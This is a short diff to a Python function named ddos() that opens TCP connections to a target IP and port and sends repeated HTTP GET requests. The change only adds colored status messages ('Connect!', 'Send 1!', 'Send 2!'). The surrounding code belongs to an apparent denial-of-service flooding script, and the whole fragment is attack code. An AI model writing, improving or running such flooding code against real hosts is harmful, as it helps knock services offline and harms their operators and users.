@@ -30,8 +30,11 @@ def ddos():
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
           mysocket.connect((ip, port))
+          print("\033[1;32;40mConnect!")
           mysocket.send(str.encode("GET " + message + "HTTP/1.1 \r\n"))
+          print("\033[1;32;40mSend 1!")
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
+          print("\033[1;32;40mSend 2!")  
           print("\033[1;32;40mSuccess!")
       except socket.error:
          print("\033[1;31;40mFailed!")
